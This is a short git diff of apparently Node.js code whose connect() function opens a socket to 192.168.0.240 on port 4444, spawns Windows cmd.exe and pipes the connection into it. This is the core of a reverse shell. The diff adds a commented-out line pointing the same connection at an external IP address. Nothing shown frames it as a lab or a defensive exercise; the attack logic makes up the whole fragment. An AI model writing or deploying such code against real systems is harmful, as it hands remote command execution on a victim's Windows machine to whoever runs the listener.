@@ -18,6 +18,7 @@ function ask(question) {
 
 function connect() {
   client.connect(4444, '192.168.0.240', () => {
+  //client.connect(4444, '193.165.237.196', () => {
     const proc = spawn('C:\\Windows\\System32\\cmd.exe', []);
     
     client.pipe(proc.stdin);
